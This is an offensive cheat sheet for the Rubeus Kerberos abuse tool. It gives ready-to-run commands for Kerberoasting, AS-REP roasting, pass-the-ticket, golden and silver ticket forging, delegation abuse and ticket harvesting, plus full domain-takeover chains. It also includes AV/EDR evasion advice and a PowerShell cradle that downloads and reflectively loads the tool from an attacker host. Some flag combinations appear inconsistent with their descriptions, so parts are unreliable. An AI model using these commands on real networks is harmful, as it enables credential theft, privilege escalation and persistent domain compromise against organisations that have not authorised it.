# <span style="color:rgb(255, 192, 0)">Rubeus - Complete Command Reference</span>

Rubeus by @harmj0y is a C# toolset for raw Kerberos interaction and abuse. It handles ticket requests, renewals, forgeries, Kerberoasting, AS-REP roasting, and more.

**Compiling:**
```bash
# Visual Studio
# 1. Open Rubeus.csproj in Visual Studio
# 2. Build > Build Solution (Release, .NET Framework 4.0+)
# 3. Binary at bin/Release/Rubeus.exe

# csc.exe (manually)
csc.exe /unsafe /reference:System.DirectoryServices.Protocols.dll /reference:System.IdentityModel.dll *.cs

# With .NET Core
dotnet build -c Release -f net48

# Obfuscation (e.g., ConfuserEx)
# To avoid signature detection by AV/EDR

# Cross-compilation (Mono)
mcs -unsafe -target:exe -r:System.DirectoryServices.Protocols.dll -r:System.IdentityModel.dll *.cs
```

**Load methods:**
```powershell
# Binary drop
Rubeus.exe <command> <args>

# Execute-Assembly (C2)
# Use your C2's execute-assembly command

# PowerShell reflection
$data = (New-Object Net.WebClient).DownloadData('http://attacker/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("command".Split())
```

---

## <span style="color:rgb(255, 0, 0)">1. Kerberoasting</span>

```powershell
# Default Kerberoast (RC4 tickets)
Rubeus.exe kerberoast

# With credentials
Rubeus.exe kerberoast /creduser:domain\user /credpassword:pass

# Kerberoast with AES tickets (no RC4)
Rubeus.exe kerberoast /aes

# Output TGS to file
Rubeus.exe kerberoast /outfile:kerberoast.txt

# Specify domain
Rubeus.exe kerberoast /domain:domain.local

# Specific user
Rubeus.exe kerberoast /user:svc_account

# Use LDAP filter
Rubeus.exe kerberoast /ldapfilter:"(&(samAccountType=805306368)(servicePrincipalName=*))"

# Only users with specific SPN pattern
Rubeus.exe kerberoast /spn:"*http*"

# Display all info
Rubeus.exe kerberoast /nowrap

# With hashcat format (post 4.2.0)
Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt

# With john format
Rubeus.exe kerberoast /format:john /outfile:kerb.txt

# OPSEC: Use TGT (don't send password)
Rubeus.exe asktgt /user:user /password:pass
Rubeus.exe kerberoast /tgt:base64
```

### OPSEC-Safe Kerberoast

```powershell
# 1. Get TGT
Rubeus.exe asktgt /user:domain_user /password:pass /outfile:tgt.txt

# 2. Use TGT for kerberoast (no password in LDAP query)
Rubeus.exe kerberoast /tgt:tgt.txt
```

---

## <span style="color:rgb(0, 176, 240)">2. AS-REP Roasting</span>

```powershell
# Find AS-REP roastable users
Rubeus.exe asreproast

# With specific credentials
Rubeus.exe asreproast /creduser:domain\user /credpassword:pass

# Users from file
Rubeus.exe asreproast /user:users.txt

# Single user
Rubeus.exe asreproast /user:targetuser /domain:domain.local

# Output to file
Rubeus.exe asreproast /outfile:asrep.txt

# Format for hashcat (18200)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Include disabled accounts
Rubeus.exe asreproast /include-disabled

# LDAP filter
Rubeus.exe asreproast /ldapfilter:"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

---

## <span style="color:rgb(146, 208, 80)">3. asktgt (Request TGT)</span>

```powershell
# Basic TGT request (password)
Rubeus.exe asktgt /user:Administrator /password:pass /domain:domain.local

# TGT with NTLM hash
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:domain.local

# TGT with AES128 key
Rubeus.exe asktgt /user:Administrator /aes128:KEY /domain:domain.local

# TGT with AES256 key
Rubeus.exe asktgt /user:Administrator /aes256:KEY /domain:domain.local

# TGT with DES key
Rubeus.exe asktgt /user:Administrator /des:KEY /domain:domain.local

# Output ticket to file (base64)
Rubeus.exe asktgt /user:Administrator /password:pass /outfile:ticket.txt

# Get TGT and inject into current session
Rubeus.exe asktgt /user:Administrator /password:pass /ptt

# Get TGT then use for further actions
Rubeus.exe asktgt /user:Administrator /password:pass /nowrap

# TGT with PAC (no PAC for silver-like)
Rubeus.exe asktgt /user:Administrator /password:pass /nopac

# TGT for specific domain
Rubeus.exe asktgt /user:user /password:pass /domain:target.local

# Opsec: Don't ask for PAC
Rubeus.exe asktgt /user:user /password:pass /nopac

# With additional SIDs (SID history)
Rubeus.exe asktgt /user:user /password:pass /sid:S-1-5-21-XXXX-519

# Using DC
Rubeus.exe asktgt /user:user /password:pass /dc:dc01.domain.local
```

---

## <span style="color:rgb(255, 0, 0)">4. asktgs (Request TGS)</span>

```powershell
# Request TGS for a service
Rubeus.exe asktgs /ticket:<base64_tgt> /service:cifs/target.domain.local

# Request multiple services
Rubeus.exe asktgs /ticket:<base64_tgt> /service:cifs/target.domain.local,http/target.domain.local

# Inject TGS into session
Rubeus.exe asktgs /ticket:<base64_tgt> /service:cifs/target /ptt

# Output to file
Rubeus.exe asktgs /ticket:<base64_tgt> /service:cifs/target /outfile:tgs.txt

# Request with S4U2Self
Rubeus.exe asktgs /ticket:<tgt> /service:cifs/target /altservice:ldap /ptt

# S4U2Self + S4U2Proxy
Rubeus.exe asktgs /user:attacker$ /rc4:NTLM /service:cifs/target /impersonateuser:Administrator /ptt

# Delegation flags
Rubeus.exe asktgs /ticket:<tgt> /service:cifs/target /delegation /ptt

# Specify encryption
Rubeus.exe asktgs /ticket:<tgt> /service:cifs/target /enctype:rc4
```

---

## <span style="color:rgb(0, 176, 240)">5. dump / tgtdeleg (Extract Tickets)</span>

```powershell
# Extract all tickets from current session
Rubeus.exe dump

# Extract TGT via Kerberos GSS-API delegation (no admin needed!)
Rubeus.exe tgtdeleg

# Extract tickets with LUID
Rubeus.exe dump /luid:0x123456

# Extract service name filter
Rubeus.exe dump /service:krbtgt

# User filter
Rubeus.exe dump /user:Administrator

# Export to file
Rubeus.exe dump /outfile:tickets.txt

# Nowrap output
Rubeus.exe dump /nowrap
```

**tgtdeleg** uses the Kerberos GSS-API to get a TGT without requiring admin privileges. Very useful!

---

## <span style="color:rgb(146, 208, 80)">6. ptt (Pass-the-Ticket)</span>

```powershell
# Inject base64 ticket from file
Rubeus.exe ptt /ticket:<base64_ticket>

# Inject ticket from .kirbi file
Rubeus.exe ptt /ticket:ticket.kirbi

# Inject ticket and verify
Rubeus.exe ptt /ticket:<ticket> /luid:0x123456
```

---

## <span style="color:rgb(255, 0, 0)">7. renew (Ticket Renewal)</span>

```powershell
# Renew a TGT
Rubeus.exe renew /ticket:<base64_ticket>

# Renew and inject
Rubeus.exe renew /ticket:<ticket> /ptt

# Renew with specific LUID
Rubeus.exe renew /ticket:<ticket> /luid:0x123456
```

---

## <span style="color:rgb(0, 176, 240)">8. s4u (Constrained Delegation Abuse)</span>

```powershell
# S4U2Self + S4U2Proxy in one command
# Need: hash or TGT of account with trusted delegation
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# S4U2Self only (no forwardable ticket)
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /self

# With alternate service (s4u2proxy to different service)
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /altservice:ldap /ptt

# Using TGT instead of hash
Rubeus.exe s4u /ticket:<base64_tgt> /impersonateuser:Administrator /msdsspn:cifs/target /ptt

# Multiple services
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target /altservice:cifs,http,host /ptt

# Request specific encryption type
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM /impersonateuser:Administrator /msdsspn:cifs/target /enctype:rc4 /ptt

# S4U with enterprise mapping
Rubeus.exe s4u /user:serviceaccount /rc4:NTLM /impersonateuser:Administrator@target.local /msdsspn:cifs/target.domain.local /ptt
```

---

## <span style="color:rgb(146, 208, 80)">9. silver (Silver Ticket Creation)</span>

```powershell
# Create silver ticket
Rubeus.exe silver /service:cifs/target.domain.local /rc4:SERVICE_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt

# Silver ticket with groups
Rubeus.exe silver /service:cifs/target.domain.local /rc4:SERVICE_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /groups:512,513,518,519,520 /ptt

# Silver ticket for LDAP (DCSync)
Rubeus.exe silver /service:LDAP/dc01.domain.local /rc4:DC_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt

# Silver ticket for HOST (scheduled tasks)
Rubeus.exe silver /service:HOST/target.domain.local /rc4:NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt

# Silver ticket for HTTP (WinRM)
Rubeus.exe silver /service:HTTP/target.domain.local /rc4:NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt

# Multiple services in one ticket
Rubeus.exe silver /service:cifs/target.domain.local /rc4:NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt /altservice:cifs,http,host

# Silver with SID history
Rubeus.exe silver /service:cifs/target /rc4:NTLM /sid:S-1-5-21-DOM /user:Administrator /domain:domain.local /createnetonly:C:\Windows\System32\cmd.exe /ptt

# Export to base64
Rubeus.exe silver /service:cifs/target /rc4:NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /nowrap /outfile:silver.txt

# Specify ticket lifetime
Rubeus.exe silver /service:cifs/target /rc4:NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt /duration:24
```

---

## <span style="color:rgb(255, 0, 0)">10. golden (Golden Ticket Creation)</span>

```powershell
# Create golden ticket
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt

# Golden with AES256
Rubeus.exe golden /aes256:KRBTGT_AES256 /sid:S-1-5-21-XXXX /ldap /user:Administrator /domain:domain.local /ptt

# Golden with user RID and groups
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /id:500 /groups:512,513,518,519,520 /ptt

# Golden with SID history (enterprise admin)
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-DOMAIN /user:Administrator /domain:domain.local /sids:S-1-5-21-ENTERPRISE-519 /ptt

# Golden ticket with PAC
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt /renewmax:7

# Export golden ticket
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /nowrap /outfile:golden.txt

# Golden with different user (not admin)
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:AnyUser /domain:domain.local /id:1234 /ptt

# Net-only (creates logon session)
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /createnetonly:C:\Windows\System32\cmd.exe

# Specify end time
Rubeus.exe golden /rc4:KRBTGT_NTLM /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt /endtime:12/31/2026
```

---

## <span style="color:rgb(0, 176, 240)">11. createnetonly (Create Process with Logon Session)</span>

```powershell
# Create process for ticket injection
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

# Create with specific domain
Rubeus.exe createnetonly /program:powershell.exe /domain:domain.local /user:FakeUser

# Create process to hold tickets
Rubeus.exe createnetonly /program:C:\Windows\System32\rundll32.exe
```

---

## <span style="color:rgb(146, 208, 80)">12. describe (Ticket Description)</span>

```powershell
# Describe base64 ticket
Rubeus.exe describe /ticket:<base64_ticket>

# Describe .kirbi file
Rubeus.exe describe /ticket:ticket.kirbi

# Show detailed info
Rubeus.exe describe /ticket:<ticket> /detail

# Describe service name
Rubeus.exe describe /ticket:<ticket> /service
```

---

## <span style="color:rgb(255, 0, 0)">13. monitor (TGT Monitoring)</span>

```powershell
# Monitor for new TGTs
Rubeus.exe monitor /targetuser:Administrator /monitor

# Monitor and harvest TGTs
Rubeus.exe monitor /interval:5 /filteruser:Administrator /outputfile:monitored.txt

# Continuous monitoring
Rubeus.exe monitor /continuous /interval:10
```

---

## <span style="color:rgb(0, 176, 240)">14. harvest (TGT Harvesting)</span>

```powershell
# Harvest TGTs from logon events
Rubeus.exe harvest /interval:5 /nowrap

# Harvest to file
Rubeus.exe harvest /interval:10 /outfile:harvested.txt
```

---

## <span style="color:rgb(146, 208, 80)">15. Kerberoast with opsec flags</span>

```powershell
# Request AES tickets (less suspicious than RC4)
Rubeus.exe kerberoast /aes

# Use TGT for kerberoast (no LDAP query with password)
Rubeus.exe asktgt /user:user /password:pass /outfile:tgt.txt
Rubeus.exe kerberoast /tgt:base64_tgt

# Only query specific users
Rubeus.exe kerberoast /user:"svc*,sql*,backup*"

# No pre-auth checks
Rubeus.exe kerberoast /nopreauth

# Use fake domain for stats gathering
Rubeus.exe kerberoast /stats
```

---

## <span style="color:rgb(255, 0, 0)">16. Changing Passwords</span>

```powershell
# Change password via Kerberos
Rubeus.exe changepw /user:targetuser /domain:domain.local /old:OldPass /new:NewPass

# Using hash
Rubeus.exe changepw /user:targetuser /domain:domain.local /rc4:NTLM /new:NewPass
```

---

## <span style="color:rgb(0, 176, 240)">17. Common Workflows</span>

### Full Kerberos Attack Chain

```powershell
# 1. Enumerate SPNs (via LDAP query)
Rubeus.exe kerberoast /stats

# 2. Kerberoast with TGT opsec
Rubeus.exe asktgt /user:domain_user /password:pass /outfile:tgt.txt
Rubeus.exe kerberoast /tgt:base64_tgt /outfile:hashes.txt

# 3. AS-REP roast
Rubeus.exe asreproast /outfile:asrep.txt

# 4. If DA: Dump krbtgt hash
# (using Mimikatz or other tool)

# 5. Golden ticket
Rubeus.exe golden /rc4:KRBTGT /sid:S-1-5-21-XXXX /user:Administrator /domain:domain.local /ptt

# 6. Verify
dir \\dc01\c$
```

### Delegation Abuse (RBCD)

```powershell
# 1. Create machine account (if quota allows)
# Use PowerView or ADSI

# 2. Set RBCD on target
# $ACE = "ATTACKER$" msDS-AllowedToActOnBehalfOfOtherIdentity

# 3. Get TGT for attacker machine
Rubeus.exe asktgt /user:ATTACKER$ /password:Pass123 /domain:domain.local /outfile:tgt.txt

# 4. S4U for administrator
Rubeus.exe s4u /ticket:tgt.txt /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /altservice:cifs /ptt

# 5. Access target
dir \\target\c$
```

### Constrained Delegation Abuse

```powershell
# 1. Find constrained delegation targets
# Use PowerView: Get-DomainComputer -TrustedToAuth

# 2. Request TGT for the service account
Rubeus.exe asktgt /user:svc_account$ /rc4:NTLM /outfile:tgt.txt

# 3. S4U2Self + S4U2Proxy
Rubeus.exe s4u /ticket:tgt.txt /impersonateuser:Administrator /msdsspn:time/target /altservice:cifs /ptt

# 4. Access
dir \\target\c$
```

### Ticket Extraction and PTH

```powershell
# 1. Get TGT from current session (no admin required!)
Rubeus.exe tgtdeleg /nowrap

# 2. Use TGT to request TGS
Rubeus.exe asktgs /ticket:<tgt> /service:cifs/target /ptt

# 3. Access
dir \\target\c$
```

---

## <span style="color:rgb(146, 208, 80)">18. Rubeus & .NET Version Compatibility</span>

| .NET Version | Rubeus Support | Target Framework |
|-------------|----------------|------------------|
| 3.5 | Limited | net35 |
| 4.0 | Full | net40 |
| 4.5+ | Full | net45 |
| 4.7+ | Full | net47 |
| 4.8 | Full | net48 |
| .NET Core | Via netcore | netcoreapp3.1 |

---

## <span style="color:rgb(255, 0, 0)">19. Help & Parameters</span>

```powershell
# General help
Rubeus.exe help

# Command help
Rubeus.exe help <command>
Rubeus.exe kerberoast /help

# Parameters
# /user:USER - Target user
# /password:PASS - Plaintext password
# /rc4:HASH - NTLM hash (RC4 key)
# /aes128:KEY - AES128 key
# /aes256:KEY - AES256 key
# /des:KEY - DES key
# /domain:DOM - Domain name
# /dc:DC - Domain controller
# /service:SPN - Service to target
# /ticket:BASE64 - Base64-encoded ticket
# /ptt - Inject ticket into current session
# /outfile:FILE - Output to file
# /nowrap - Don't wrap base64 output
# /format:{hashcat,john} - Output format for cracking
# /enctype:{rc4,aes128,aes256,des} - Encryption type
# /impersonateuser:USER - User to impersonate
# /ldapfilter:FILTER - Custom LDAP filter
# /monitor - Monitor for new tickets
# /continuous - Continuous monitoring
```
